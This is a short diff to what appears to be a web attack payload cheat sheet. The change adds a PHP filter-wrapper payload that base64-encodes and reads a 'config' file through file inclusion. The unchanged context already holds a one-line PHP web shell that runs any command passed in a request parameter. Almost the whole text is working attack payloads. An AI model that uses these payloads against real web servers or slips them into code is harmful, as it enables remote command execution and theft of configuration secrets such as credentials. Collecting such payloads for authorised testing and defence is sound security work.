@@ -1,5 +1,9 @@
 # PHP
 
+# PHP filter
+
+php://filter/convert.base64-encode/resource=config
+
 # CMD
     <?php system($_REQUEST['pwn']); ?>
 
